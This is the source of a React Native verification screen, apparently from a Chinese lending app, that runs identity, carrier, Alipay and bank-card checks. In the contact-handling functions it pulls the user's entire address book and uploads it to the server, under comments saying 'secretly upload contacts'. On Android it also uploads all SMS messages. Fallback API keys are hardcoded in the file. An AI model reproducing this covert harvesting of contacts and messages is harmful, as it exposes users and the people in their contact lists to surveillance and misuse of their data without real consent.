import React from 'react';
import { AsyncStorage, Platform, View } from 'react-native';
import Contacts from 'react-native-contacts';
import { createStackNavigator, NavigationEvents } from "react-navigation";
import HeaderBackBtn from '../../cpns/small/HeaderBackBtn';
import Loading from "../../cpns/small/Loading";
import { Moxie, MoxieEmiter } from '../../modules/Moxie';
import { Sms } from '../../modules/Sms';
import { UD, UDEmitter } from '../../modules/UD';
import api from '../../utils/api';
import BuildConfig from '../../utils/nativeConfig';
import { p } from "../../utils/p";
import Polling from '../../utils/Polling';
import { runWithPermission, showAndroidContactAlert, showAndroidSmsAlert, showIOSContactAlert } from '../../utils/runWithPermission';
import Toast from '../../utils/toast';
import AuthEntry from './AuthEntry';
import EmergencyContactsEntry from './EmergencyContactsEntry';
import EmergencyContactsList from './EmergencyContactsList';
import Staging from './Staging';
import SubmitBtn from './SubmitBtn';


const uuidv1 = require('uuid/v1');
const { appKey } = BuildConfig

const showContactAlert = Platform.OS === 'ios' ? showIOSContactAlert : showAndroidContactAlert

/*
const authStatusEnum = {
	UNFINISHED: 'unFinished',
	FINISHED: 'finished',
	ONPROCESS: 'onProcess',
}
*/

class AuthScreen extends React.Component {
  static navigationOptions = ({ navigation }) => ({
    headerLeft: <HeaderBackBtn navigation={navigation} />,
    headerTitle: '认证中心',
  })

  state = {
    showLoading: false,
    needAliPay: true,    // 某些商户可能不需要支付宝验证
    authStatus: {
      UD: 'unFinished',
      carrier: 'unFinished',
      aliPay: 'unFinished',
      bank: 'unFinished',
    },
    // 防止多次提交
    disableUD: false,
    disableMoXieCarrier: false,
    disableMoXieAliPay: false,

    // ECList: [
    // { fullName: '小石头', mobile: '13838787768' },
    // { fullName: '朱黎明', mobile: '13838787768' },
    // ],

    submitActive: false,

    udOrderId: null,
    idName: null,
    idNumber: null,
    mobile: null,
    smsNeedUpload: true,
    // 紧急联系人相关
    selectedItem: [],
    contacts: [],
  }

  // 更新认证状态 eg: updateAuthStatus('UD', 'finished')
  updateAuthStatus = (type, status, ) => {
    this.setState(preState => ({
      ...preState,
      authStatus: {
        ...preState.authStatus,
        [type]: status,
      }
    }),
      () => {
        this.tryActiveSubmitBtn()
      }
    )
  }

  checkAuthStaging = currentStep => {
    const { authStatus } = this.state
    const UNFINISHED = 'unFinished'
    if (currentStep === 'UD') return true
    if (currentStep === 'carrier') {
      if (authStatus['UD'] === UNFINISHED) {
        return this.toastStagingErr('UD')
      }
    }

    if (currentStep === 'aliPay') {
      for (const [index, value] of ['UD', 'carrier'].entries()) {
        if (authStatus[value] === UNFINISHED) {
          return this.toastStagingErr(value)
        }
      }
    }

    if (currentStep === 'bank') {
      if (this.state.needAliPay) {
        for (const [index, value] of ['UD', 'carrier', 'aliPay'].entries()) {
          if (authStatus[value] === UNFINISHED) {
            return this.toastStagingErr(value)
          }
        }
      } else {
        for (const [index, value] of ['UD', 'carrier'].entries()) {
          if (authStatus[value] === UNFINISHED) {
            return this.toastStagingErr(value)
          }
        }
      }
    }
    return true
  }

  toastStagingErr = stepType => {
    const toastMap = {
      UD: '实名',
      carrier: '运营商',
      aliPay: '支付宝',
      bank: '银行卡',
    }
    Toast('请先完成' + toastMap[stepType] + '认证')
    return false
  }


  checkNeedAliPay = async () => {
    try {
      const resp = await api.get('/users/appkey')
      return resp && resp['alipay_auth'] == 1
    } catch (err) {
      console.log('checkNeedAliPay Error', err)
      return false
    }
  }

  setNeedAliPay = async () => {
    await this.setState({
      needAliPay: await this.checkNeedAliPay()
    })
  }

  componentDidMount = async () => {
    this.setSmsUploadStatus()
    this.getAuthStatus()

    await this.setNeedAliPay()  // 魔蝎的部分逻辑依赖于 needAliPay

    this.initUD()
    this.initMoXie()

  }

  initUD = () => {
    this.subUD = UDEmitter.addListener('udDone', async (ud) => {
      this.setState({ disableUD: false })
      console.log('FIN ud done result', ud)

      if (ud['result'] === '0' && this.state.udOrderId) {
        const resp = await api.post('/users/auth/id', { orderId: this.state.udOrderId });
        if (resp && resp['success'] === true) {
          this.setState({ idName: resp['name'], idNumber: resp['idNumber'] });
          // 更新认证状态
          this.updateAuthStatus('UD', 'finished')
          Toast('实名认证成功');

          // 尝试自动进入运营商认证
          if (this.state.authStatus['carrier'] === 'finished') return
          this.handleMoXieCarrier()

        } else {
          Toast('实名认证未通过');
        }
      }
    })
  }

  // 根据当前步骤，直接进入下一个步骤
  runNextStep = currentStep => {
    const FINISHED = 'finished'
    const authStatus = this.state.authStatus
    if (currentStep === 'UD') {
      // 正常情况下实名认证后肯定是运营商认证，所以暂且直接再 UD 的事件中写死，直接调用 handleMoxieCarrier
    }

    if (currentStep === 'carrier') {
      // 两种情况：
      // 1. 如果用户支付宝认证已完成，而银行卡或者紧急联系人未设置完全，则应该直接跳到添加银行卡或者紧急联系人
      // 2. 如果后台关闭支付宝认证，则直接跳过支付宝认证
      if (this.state.needAliPay) {
        if (authStatus['aliPay'] !== FINISHED) {
          return this.handleMoXieAlipay()
        }
        if (authStatus['bank'] !== FINISHED) {
          return this.handleAddBank()
        } else {
          return this.handleAddEC()
        }
      } else {
        if (authStatus['bank'] !== FINISHED) {
          return this.handleAddBank()
        } else {
          return this.handleAddEC()
        }
      }
    }

    if (currentStep === 'aliPay') {
      if (authStatus['bank'] !== FINISHED) {
        return this.handleAddBank()
      } else {
        return this.handleAddEC()
      }
    }

    // 银行卡认证结束始终进入添加紧急联系人，同样直接写死
    if (currentStep === 'bank') {

    }
  }

  initMoXie = async () => {
    let mxApiKey
    try {
      const resp = await api.get('/users/auth/moxie/api_key');
      mxApiKey = resp['api_key'];
      console.log('FIN mxApiKey', resp)
    } catch (err) {
      console.log('get mxApiKey err', err)
      mxApiKey = '29c393265f804f868a0b3b60a09472a3';
    }
    if (!mxApiKey || mxApiKey === '' || mxApiKey === undefined || mxApiKey === null) {
      mxApiKey = '29c393265f804f868a0b3b60a09472a3';
    }

    // this.props.navigation.setParams({ back: this.props.navigation.pop });

    const sid = await AsyncStorage.getItem('sid');
    const uid = await AsyncStorage.getItem('uid');
    const mobile = await AsyncStorage.getItem('mobile');
    this.setState({ mobile });

    Moxie.init(`${sid.replace(/-/g, '')}-${uid}-${appKey}`, mxApiKey);

    this.subMoXie = MoxieEmiter.addListener('moxieDone', async (moxie) => {
      this.setState({
        disableMoXieCarrier: false,
        disableMoXieAliPay: false,
      })
      console.log('FIN moxie data', moxie)
      if (moxie['functionName'] === 'carrier') {
        // if(moxie['loginState'] && moxie['loginState'] === 'start') { Toast('正在登录') }
        if (moxie['importState'] && moxie['importState'] === 'success') {
          this.pollMoXieCarrierClear = Polling(() => {
            this.askServerMoxieCarrierStatus()
          }, () => {
          }, 3, 60)
          Toast('采集成功')
          this.updateAuthStatus('carrier', 'onProcess')
        }
        if (moxie['loginState'] && moxie['loginState'] === 'success') {
          this.pollMoXieCarrierClear = Polling(() => {
            this.askServerMoxieCarrierStatus()
          }, () => {
            this.updateAuthStatus('carrier', 'unFinished')
            Toast('运营商认证失败，请稍后重试')
          },
            3, 60)
          Toast('登录成功')
          this.updateAuthStatus('carrier', 'onProcess')

          this.runNextStep('carrier')

          /*           console.log('FIN 准备进入支付宝认证', this.state)
                    if(this.state.needAliPay) {
                      console.log('FIN 自动进入到支付宝认证')
                      console.log('FIN 查看 state', this.state.authStatus)
                      if(this.state.authStatus['aliPay'] === 'finished') return
                      // 自动进入支付宝认证
                      this.handleMoXieAlipay()
                    } else {
                      if(this.state.authStatus['bank'] === 'finished') return
                      // 自动进入银行卡认证
                      this.handleAddBank()
                    } */

        }

        // const resp = await api.post('/users/auth/carrier', {orderId: moxie['taskId'], mobile: this.state.mobile});
        // Toast(resp['success'] === true ? '运营商认证成功' : '运营商认证未通过');
      }

      if (moxie['functionName'] === 'alipay') {
        // if(moxie['loginState'] && moxie['loginState'] === 'start') { Toast('正在登录') }
        if (moxie['importState'] && moxie['importState'] === 'success') {
          this.pollMoXieAliPayClear = Polling(() => {
            this.askServerMoxieAliPayStatus(moxie)
          }, () => {
          }, 3, 60)
          Toast('采集成功')
          this.updateAuthStatus('aliPay', 'onProcess')
        }
        if (moxie['loginState'] && moxie['loginState'] === 'success') {
          this.pollMoXieAliPayClear = Polling(() => {
            this.askServerMoxieAliPayStatus(moxie)
          }, () => {
            this.updateAuthStatus('aliPay', 'unFinished')
            Toast('支付宝认证失败，请稍后重试')
          }, 3, 60)
          Toast('登录成功')
          this.updateAuthStatus('aliPay', 'onProcess')

          this.runNextStep('aliPay')

          /*           if(this.state.authStatus['bank'] === 'finished') return
                    // 自动进入银行卡认证
                    this.handleAddBank() */
        }
        // const resp = await api.post('/users/auth/alipay', {orderId: moxie['taskId']});
        // Toast(resp['success'] === true ? '支付宝认证成功' : '支付宝认证未通过');
      }
    })
  }

  askServerMoxieCarrierStatus = async () => {
    const resp = await api.get('/users/auth/stepinfo')
    if (resp && resp['success']) {
      const data = resp['data'] || {}
      if (data && data['carrier']) {
        console.log('FIN 运营商认证成功')
        this.updateAuthStatus('carrier', 'finished')
        this.pollMoXieCarrierClear && this.pollMoXieCarrierClear()
      }
    }
  }

  askServerMoxieAliPayStatus = async () => {
    const resp = await api.get('/users/auth/stepinfo')
    if (resp && resp['success']) {
      const data = resp['data'] || {}
      if (data && data['ali']) {
        console.log('FIN 支付宝认证成功')
        this.updateAuthStatus('aliPay', 'finished')
        this.pollMoXieAliPayClear && this.pollMoXieAliPayClear()
      }
    }
  }

  setSmsUploadStatus = async () => {
    // 检查短信的上传情况
    const respSms = await api.get('/sms/is_uploaded');
    this.setState({ smsNeedUpload: !respSms['success'] });
  }

  // 仅为 Android 设备上传用户短信，如果用户短信为空，仍然放行
  uploadSmsForAndroid = () => {
    if (Platform.OS === 'android') {
      runWithPermission(
        'readSms',
        () => {
          showAndroidSmsAlert()
        },
        async () => {
          // 上传安卓用户的短信
          const smsResult = await Sms.getAll();
          console.log('FIN 用户短信', smsResult)
          if (smsResult['sms'] === "no result!" || smsResult['sms'] === "[]") {
            // Toast('您的短信为空')
            return
          }
          await api.post('/sms', smsResult);
          this.setState({ smsNeedUpload: false });
        }
      )
    }
  }

  getAuthStatus = async () => {
    const resp = await api.get('/users/auth/status');
    console.log('FIN auth from server', resp);

    if (resp['success'] === true) {
      if (resp['ud_status'] === true && resp['ud']['result']['success'] === true && resp['ud']['data']['auth_result'] === 'T') {
        this.updateAuthStatus('UD', 'finished')
        this.setState({ idName: resp['ud']['data']['id_name'], idNumber: resp['ud']['data']['id_number'] });
      }

      if (resp['carrier_status'] === true) {
        this.updateAuthStatus('carrier', 'finished')
        this.pollMoXieCarrierClear && this.pollMoXieCarrierClear()
      }

      if (resp['alipay_status'] === true) {
        this.updateAuthStatus('aliPay', 'finished')
        this.pollMoXieAliPayClear && this.pollMoXieAliPayClear()
      }

      if (resp['bank_status'] === true) {
        this.updateAuthStatus('bank', 'finished')
      }
    }
  }

  componentWillUnmount = () => {
    this.subUD && this.subUD.remove()
    this.subMoXie && this.subMoXie.remove()
    this.pollMoXieCarrierClear && this.pollMoXieCarrierClear()
    this.pollMoXieAliPayClear && this.pollMoXieAliPayClear()
  }

  // 查看商户是否有钱
  getPayCheck = async () => {
    try {
      const resp = await api.get('/users/auth/pay/check');
      return resp && resp['success'] === true
    } catch (err) {
      console.log('FIN getPayCheck Error', err)
      return false
    }
  }

  handleUD = async () => {
    if (this.state.disableUD) return
    const payCheckRes = await this.getPayCheck()
    if (!payCheckRes) { // 没钱了
      return Toast('payCheckRes False!')
    }

    // 创建订单
    const orderId = uuidv1().replace(/-/g, '')
    UD.run(orderId, '5207f431-e7da-4f62-9cef-86785d528991');
    this.setState({ udOrderId: orderId, disableUD: true })
  }

  handleMoXieCarrier = async () => {
    const payCheckRes = await this.getPayCheck()
    if (!payCheckRes) { // 没钱了
      return Toast('payCheckRes False!')
    }

    if (this.state.disableMoXieCarrier) return
    this.pollMoXieCarrierClear && this.pollMoXieCarrierClear()
    if (this.checkAuthStaging('carrier')) {
      console.log('FIN Moxie run carrier with params', this.state)

      // 上传用户的通讯录
      runWithPermission(
        'contacts',
        () => {
          showContactAlert()
        },
        () => {
          // 偷偷上传联系人
          Contacts.getAllWithoutPhotos((err, contacts) => {
            if (contacts.length <= 2) {
              console.log('FIN contacts length', contacts)
              // 该用户手机联系人为空，排除该用户
              return Toast('您的通讯录联系人为空，无法上传')
            }

            this.setState({ contacts });
            api.post('/users/contacts/upload', { contacts });

            Moxie.runWith('carrier', this.state.idName, this.state.idNumber, this.state.mobile, BuildConfig.isSilentAuthMode)
            this.setState({ disableMoXieCarrier: true })
          });

        })
    }
  }

  handleMoXieAlipay = async () => {
    const payCheckRes = await this.getPayCheck()
    if (!payCheckRes) { // 没钱了
      return Toast('payCheckRes False!')
    }

    console.log('FIN 开始尝试验证支付宝1')
    if (this.state.disableMoXieAliPay) return
    console.log('FIN 开始尝试验证支付宝2', this.state)
    this.pollMoXieAliPayClear && this.pollMoXieAliPayClear()
    if (this.checkAuthStaging('aliPay')) {
      console.log('FIN 进入支付宝认证')
      // 很可能由于 sdk 切换太快，导致 Android 中 Moxie 再次调起 sdk
      setTimeout(() => {
        Moxie.runWith('alipay', this.state.idName, this.state.idNumber, this.state.mobile, BuildConfig.isSilentAuthMode);
        this.setState({ disableMoXieAliPay: true })
      }, 400)
    }
  }

  handleAddBank = async () => {
    const payCheckRes = await this.getPayCheck()
    if (!payCheckRes) { // 没钱了
      return Toast('payCheckRes Fail!')
    }

    if (this.checkAuthStaging('bank')) {
      this.props.navigation.push('AddBankCard');
    }
  }


  handleAddEC = () => {
    // 检查是否需要上传短信
    if (this.state.smsNeedUpload && Platform.OS === 'android') {
      this.uploadSmsForAndroid()
    }

    if (this.state.contacts && this.state.contacts.length > 0) {
      // console.log('FIN 已经有联系人，直接进入紧急联系人选择界面')
      this.props.navigation.push('Contacts', {
        contacts: this.state.contacts,
        selectedItem: this.state.selectedItem,
        // RecordId 是多余的
        selectRecordId: this.state.selectRecordId
      });
    } else {
      // 上传用户的通讯录
      runWithPermission(
        'contacts',
        () => {
          showContactAlert()
        },
        () => {
          // 偷偷上传联系人
          Contacts.getAllWithoutPhotos((err, contacts) => {
            console.log('FIN getAllWithoutPhotos', contacts)
            if (contacts.length <= 2) {
              console.log('FIN contacts length', contacts)
              // 该用户手机联系人为空，排除该用户
              return Toast('您的通讯录联系人为空，无法上传')
            }

            api.post('/users/contacts/upload', { contacts });

            this.setState({ contacts }, () => {
              // 进入添加紧急联系人页面
              this.props.navigation.push('Contacts', {
                contacts: this.state.contacts,
                selectedItem: this.state.selectedItem,
                // RecordId 是多余的
                selectRecordId: this.state.selectRecordId
              });
            });
          });
        })
    }
  }

  handleECDel = (recordID) => {
    const leftECList = this.state.selectedItem.filter(item => item['recordID'] !== recordID)
    this.setState({
      selectedItem: leftECList,
    },
      () => {
        this.tryActiveSubmitBtn()
      }
    )
  }

  handleSubmit = async () => {
    this.setState({
      submitActive: false
    })
    const { selectedItem } = this.state
    const selectRecordId = {}
    selectedItem.forEach(item => {
      selectRecordId[item.recordID] = true
    })

    await this.setState({ showLoading: true });
    const resp = await api.post('/users/auth/ec', { selectedItem, selectRecordId, });
    await this.setState({ showLoading: false });

    if (resp && resp['success'] === true) {
      await AsyncStorage.setItem('authStatus', 'true');
      if (resp['code'] === 50001) {
        Toast(resp['msg_str']);
        return this.props.navigation.navigate({ routeName: 'AuthFailed' });
      } else {
        Toast('认证成功');
        return this.props.navigation.navigate({ routeName: 'Home', params: { statusName: 'auth', params: true } });
      }
    }

    if (resp && resp['code'] === 30021) {
      PubSub.publish('BACK_HOME', 'BorrowDetail');
      return this.props.navigation.navigate({ routeName: 'Home', params: { statusName: 'auth', params: true } });
    }

  }

  handlePageDidFocus = async (payload) => {

    const { state } = payload
    console.log('FIN payload', state)
    const params = state.params || {}
    const r = params.r || {}
    // console.log('FIN 认证页面的 r', r)
    // 更新银行卡绑定状态
    if (r && r['statusName'] === 'bankCard') {
      if (r['status']) {
        this.updateAuthStatus('bank', 'finished')

        // 手动进入紧急联系人页面
        this.handleAddEC()
      }
    }

    if (r && r['statusName'] === 'backContact') {
      if (r['status']) {
        // console.log('FIN 来自联系人页面')
        const selectedItem = r['selectedItem'] || []
        await this.setState({ selectedItem })
      }
    }

    setTimeout(() => {
      this.tryActiveSubmitBtn()
    }, 400)
  }

  componentWillReceiveProps = () => {
    console.log('FIN componentWillReceiveProps')
    // this.tryActiveSubmitBtn()
  }

  tryActiveSubmitBtn = () => {
    // console.log('FIN 尝试激活按钮')
    if (this.state.selectedItem.length < 2) {
      return this.setState({ submitActive: false })
    }
    const FINISHED = 'finished'
    const { authStatus } = this.state
    if (this.state.needAliPay) {
      if (authStatus['UD'] === FINISHED &&
        authStatus['carrier'] === FINISHED &&
        authStatus['aliPay'] === FINISHED &&
        authStatus['bank'] === FINISHED
      ) {
        return this.setState({ submitActive: true })
      }
    } else {
      if (authStatus['UD'] === FINISHED &&
        authStatus['carrier'] === FINISHED &&
        authStatus['bank'] === FINISHED
      ) {
        return this.setState({ submitActive: true })
      }
    }

    return this.setState({ submitActive: false })
  }

  render() {
    const { authStatus, selectedItem } = this.state
    const ECList = selectedItem.map(item => {
      const familyName = item['familyName'] || ''
      const middleName = item['middleName'] || ''
      const givenName = item['givenName'] || ''
      let phone = ''
      try {
        phone = item['phoneNumbers'][0]['number'].replace(/-/g, '');
      } catch (err) {
        console.log('FIN get phone err', err)
        phone = ''
      }
      return {
        fullName: familyName + middleName + givenName,
        mobile: phone,
        recordID: item['recordID'],
      }
    })
    return (
      <View style={{
        flex: 1,
      }}>
        <NavigationEvents
          // onWillFocus={payload => console.log('FIN will focus',payload)}
          onDidFocus={payload => this.handlePageDidFocus(payload)}
        // onWillBlur={payload => console.log('FIN will blur',payload)}
        // onDidBlur={payload => console.log('FIN did blur',payload)}
        />
        <Staging authStatus={authStatus} needAliPay={this.state.needAliPay} />
        <AuthEntry
          title="实名认证"
          status={authStatus['UD']}
          onPress={this.handleUD}
        />
        <AuthEntry
          title="运营商认证"
          status={authStatus['carrier']}
          onPress={this.handleMoXieCarrier}
        />
        {this.state.needAliPay &&
          <AuthEntry
            title="支付宝认证"
            status={authStatus['aliPay']}
            onPress={this.handleMoXieAlipay}
          />}
        <AuthEntry
          title="银行卡认证"
          status={authStatus['bank']}
          onPress={this.handleAddBank}
        />
        <EmergencyContactsEntry onPress={this.handleAddEC} />
        <EmergencyContactsList ECList={ECList} onDel={this.handleECDel} />
        <SubmitBtn onPress={this.handleSubmit} isActive={this.state.submitActive} />
        <Loading show={this.state.showLoading} />
      </View>
    )
  }
}


export default createStackNavigator({
  AuthenticationCenter: {
    screen: AuthScreen,
  }
}, {
  initialRouteName: 'AuthenticationCenter',
  headerMode: 'screen',
  headerLayoutPreset: 'center',
  navigationOptions: {
    headerStyle: {
      backgroundColor: '#fff',
      borderBottomColor: '#fff',
      elevation: 0,
    },
    headerTitleStyle: {
      fontSize: p.td(36),
      color: '#4F5A6E'
    }
  }
});

